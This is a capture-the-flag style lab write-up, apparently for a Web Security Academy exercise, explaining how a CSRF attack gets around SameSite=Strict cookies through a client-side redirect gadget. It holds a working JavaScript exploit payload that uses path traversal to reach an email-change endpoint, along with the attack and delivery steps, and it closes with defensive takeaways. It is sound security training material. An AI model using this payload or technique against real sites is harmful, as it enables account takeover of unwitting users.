# CSRF – SameSite Strict Bypass via Client-Side Redirect

(**Web Security Academy**)

This lab demonstrates how **SameSite=Strict cookies can still be bypassed** using a **client-side redirect gadget** that causes the browser to make a **same-site request after an initial cross-site navigation**.

---

## Lab: SameSite Strict Bypass via Client-Side Redirect

**Category:** Cross-Site Request Forgery (CSRF)
**Protection Mechanism:** SameSite=Strict cookies
**Difficulty:** Practitioner
**Tools Used:** Burp Suite Community Edition
**Status:** Solved

---

## What This Lab Is About

The application attempts to prevent CSRF by setting session cookies with:

```
SameSite=Strict
```

This blocks cookies from being sent in **direct cross-site requests**.
However, the application contains a **client-side redirect gadget** that can be abused to:

* Trigger a same-site request
* Include authenticated session cookies
* Perform a CSRF attack without a token

---

## Target Functionality

Vulnerable endpoint:

```http
POST /my-account/change-email
```

Parameters:

* `email`
* `submit`

There is **no CSRF token** protecting this action.

---

## Key Observations

### 1. SameSite=Strict Is Enabled

From the login response:

```
Set-Cookie: session=...; SameSite=Strict
```

This prevents cookies from being included in **direct cross-site requests**.

---

### 2. Client-Side Redirect Gadget Exists

After posting a blog comment, the browser loads:

```
/post/comment/confirmation?postId=x
```

Then, **JavaScript performs a client-side redirect** using:

```
/resources/js/commentConfirmationRedirect.js
```

The redirect URL is constructed dynamically using the `postId` parameter.

---

## Finding the Redirect Gadget

### Testing Parameter Injection

Visiting:

```
/post/comment/confirmation?postId=foo
```

Results in a redirect to:

```
/post/foo
```

Injecting path traversal:

```
/post/comment/confirmation?postId=1/../../my-account
```

Browser normalizes the path and redirects to:

```
/my-account
```

This confirms we can force a **GET request to any endpoint** on the same origin.

---

## Why This Bypasses SameSite=Strict

1. Initial request is cross-site → cookies not sent
2. JavaScript executes on the target origin
3. Client-side redirect is **same-site**
4. Browser **includes session cookies**
5. Authentication is preserved

---

## Confirming GET-Based Email Change

In Burp Repeater:

* Converted `POST /my-account/change-email` to GET
* Observed the endpoint **accepts GET requests**

Example:

```http
GET /my-account/change-email?email=test@web-security-academy.net&submit=1
```

Email change succeeds.

---

## CSRF Exploit Payload

Hosted on the exploit server:

```html
<script>
    document.location =
        "https://YOUR-LAB-ID.web-security-academy.net/" +
        "post/comment/confirmation?" +
        "postId=1/../../my-account/change-email" +
        "?email=csrf-strict-bypass@web-security-academy.net%26submit=1";
</script>
```

### Important Notes

* `submit=1` is required by the endpoint
* `&` must be URL-encoded as `%26`
* The second request is **same-site**, so cookies are included

---

## Attack Flow

1. Victim is logged in
2. Victim visits attacker-controlled exploit page
3. Browser loads comment confirmation page
4. Client-side JavaScript performs redirect
5. Redirect targets `/my-account/change-email`
6. Session cookie is included
7. Email address is changed
8. CSRF succeeds despite SameSite=Strict

---

## Verification & Delivery

1. Stored exploit on exploit server
2. Clicked **View exploit** to test on myself
3. Confirmed email change
4. Modified email to avoid matching my own
5. Clicked **Deliver exploit to victim**
6. Lab marked as **Solved**

---

## Impact

An attacker can:

* Bypass SameSite=Strict protections
* Abuse client-side redirect gadgets
* Perform authenticated actions without CSRF tokens

**Severity:** High

---

## Key Lessons Learned

* SameSite=Strict ≠ CSRF protection
* Client-side redirects are dangerous gadgets
* GET endpoints performing state changes are risky
* CSRF tokens are still mandatory
* JavaScript behavior matters for security

---

## Defensive Takeaways

To prevent this vulnerability:

* Implement CSRF tokens on all state-changing requests
* Avoid client-side redirects based on user input
* Do not allow state changes via GET requests
* Validate redirect destinations strictly
* Apply defense-in-depth (not cookie flags alone)

---

## Final Summary

* SameSite=Strict cookies were in use
* No CSRF token implemented
* Client-side redirect gadget discovered
* Path traversal used to control redirect destination
* GET-based email change abused
* CSRF attack successfully executed
* Lab solved using Burp Suite Community Edition
 
